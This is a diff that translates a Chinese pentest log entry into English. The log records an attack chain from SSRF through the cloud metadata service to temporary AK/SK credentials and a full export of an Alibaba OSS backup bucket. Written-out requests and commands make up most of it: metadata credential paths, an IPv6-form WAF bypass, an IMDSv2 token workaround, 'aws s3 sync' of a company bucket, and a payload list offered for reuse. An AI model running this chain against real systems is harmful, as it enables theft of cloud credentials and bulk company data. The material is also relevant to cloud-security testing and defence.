@@ -1,74 +1,74 @@
-# [2026-02] SSRF → 云元数据 → AK/SK → OSS 全量数据
+# [2026-02] SSRF → cloud metadata → AK/SK → full OSS data
 
-## 场景分类
-Web 渗透 / 云安全
+## Scenario category
+Web pentest / cloud security
 
-## 目标概述
-通过 Web 应用的 SSRF 漏洞访问云元数据服务，获取临时凭据，最终导出 OSS 存储桶全部数据。
+## Target overview
+Reach the cloud metadata service through an SSRF flaw in a web application, obtain temporary credentials, and ultimately export the entire contents of an OSS bucket.
 
-## 完整执行链路
+## Full execution chain
 
-1. 发现图片代理接口存在 SSRF
+1. Find SSRF in the image proxy endpoint
    ```
-   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK（内网端口探测成功）
+   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (internal port probe succeeds)
    ```
-2. 尝试访问云元数据
+2. Try reaching the cloud metadata service
    ```
    GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
-   → 返回元数据目录列表
+   → returns the metadata directory listing
    ```
-3. 获取 IAM 角色名
+3. Get the IAM role name
    ```
    GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    → ECS-Role-WebApp
    ```
-4. 获取临时凭据
+4. Get temporary credentials
    ```
    GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
    → AccessKeyId, SecretAccessKey, Token
    ```
-5. 使用凭据枚举 OSS 桶
+5. Enumerate OSS buckets with the credentials
    ```bash
    export AWS_ACCESS_KEY_ID=AKIA...
    export AWS_SECRET_ACCESS_KEY=...
    export AWS_SESSION_TOKEN=...
-   aws s3 ls  # 或 aliyun oss ls
+   aws s3 ls  # or aliyun oss ls
    ```
-6. 发现敏感桶并导出数据
+6. Identify sensitive buckets and export the data
    ```bash
    aws s3 sync s3://company-backup ./backup/
    ```
 
-## 踩坑记录
+## Pitfalls encountered
 
-| 问题 | 原因 | 解决方案 | 耗时 |
+| Problem | Cause | Fix | Time lost |
 |------|------|---------|------|
-| SSRF 被 WAF 拦截 169.254 | IP 黑名单 | 用 IPv6 地址 `[::ffff:169.254.169.254]` 绕过 | 15min |
-| 临时凭据 1 小时过期 | STS Token 有效期短 | 写脚本自动刷新 Token | 10min |
-| 元数据 v2 需要 Token | IMDSv2 防护 | 先 PUT 获取 Token，再带 Token 请求 | 20min |
+| WAF blocks 169.254 in the SSRF | IP blocklist | Bypass with the IPv6 form `[::ffff:169.254.169.254]` | 15min |
+| Temporary credentials expire after an hour | Short STS token lifetime | Script an automatic token refresh | 10min |
+| Metadata v2 requires a token | IMDSv2 protection | PUT for a token first, then send requests carrying it | 20min |
 
-## 工具链发现
-- 阿里云和 AWS 的元数据路径不同，需要分别尝试
-- IMDSv2 需要两步请求（PUT 获取 token → GET 带 token）
-- 部分云厂商已默认启用 IMDSv2，SSRF 难度增加
+## Toolchain findings
+- Alibaba Cloud and AWS use different metadata paths, so try each separately
+- IMDSv2 needs a two-step request (PUT to get a token → GET carrying it)
+- Some cloud providers now enable IMDSv2 by default, which raises the bar for SSRF
 
-## 关键代码/命令
+## Key code and commands
 
 ```bash
-# IMDSv2 绕过（需要 SSRF 支持自定义 Method 和 Header）
-# Step 1: 获取 Token
+# IMDSv2 bypass (requires the SSRF to support custom methods and headers)
+# Step 1: get a token
 PUT http://169.254.169.254/latest/api/token
 X-aws-ec2-metadata-token-ttl-seconds: 21600
 
-# Step 2: 带 Token 请求
+# Step 2: send the request carrying the token
 GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
 X-aws-ec2-metadata-token: <token>
 ```
 
-## 可复用的模式/脚本片段
+## Reusable patterns and script fragments
 
 ```bash
-# SSRF 云元数据快速检测 payload 列表
+# Quick-check payload list for SSRF against cloud metadata
 PAYLOADS=(
   "http://169.254.169.254/latest/meta-data/"
   "http://169.254.169.254/metadata/v1/"
@@ -77,14 +77,14 @@ PAYLOADS=(
 )
 ```
 
-## 对本包的改进建议
-- routing.md 已有 SSRF/云安全路由 ✓
-- 建议在 pentest-tools/references 中补充各云厂商元数据路径对照表
+## Suggested improvements to this pack
+- routing.md already has SSRF / cloud-security routes ✓
+- Suggest adding a per-provider metadata path comparison table to pentest-tools/references
 
-## 进化动作
-- [ ] 补充云元数据路径对照表到 references
+## Follow-up actions
+- [ ] Add the cloud metadata path comparison table to references
 
-## 环境信息
-- 目标: 阿里云 ECS + OSS
-- Web 框架: Spring Boot 2.7
-- SSRF 类型: 完全回显型（Full SSRF）
+## Environment
+- Target: Alibaba Cloud ECS + OSS
+- Web framework: Spring Boot 2.7
+- SSRF type: fully reflected (full SSRF)
